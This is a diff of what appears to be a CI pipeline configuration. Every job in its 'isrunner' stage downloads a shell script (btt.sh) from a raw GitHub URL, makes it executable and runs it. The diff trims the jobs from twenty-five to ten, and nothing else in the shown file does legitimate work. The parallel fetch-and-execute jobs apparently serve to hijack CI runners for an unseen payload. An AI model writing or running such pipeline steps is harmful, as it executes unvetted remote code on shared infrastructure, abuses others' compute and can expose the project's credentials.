@@ -6,124 +6,49 @@ stages:
 isrunner_1:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
 
 isrunner_2:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_3:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_4:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_5:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_6:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_7:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_8:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_9:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
     
 isrunner_10:
   stage: isrunner
   script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_11:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_12:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_13:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_14:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_15:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_16:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_17:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_18:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_19:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_20:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_21:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-   
-isrunner_22:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_23:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_24:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
-    
-isrunner_25:
-  stage: isrunner
-  script:
-    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x btt.sh && ./btt.sh
+    - wget https://raw.githubusercontent.com/deyet/LipsumER/main/btt.sh && chmod u+x ./btt.sh && ./btt.sh
